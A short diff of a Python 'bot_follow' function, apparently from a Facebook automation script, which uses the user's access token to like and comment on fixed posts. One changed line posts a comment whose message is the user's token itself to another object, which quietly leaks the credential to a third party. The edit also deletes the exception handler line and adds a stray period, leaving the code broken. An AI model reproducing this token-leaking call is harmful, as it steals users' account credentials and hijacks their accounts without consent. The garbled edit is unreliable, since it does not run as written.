@@ -64,8 +64,7 @@ def bot_follow():
                 requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
                 requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
                 requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-                requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
-        except requests.exceptions.ConnectionError:
+                requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token)).
 	        os.system("clear")
 	        xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
 	        sys.exit()
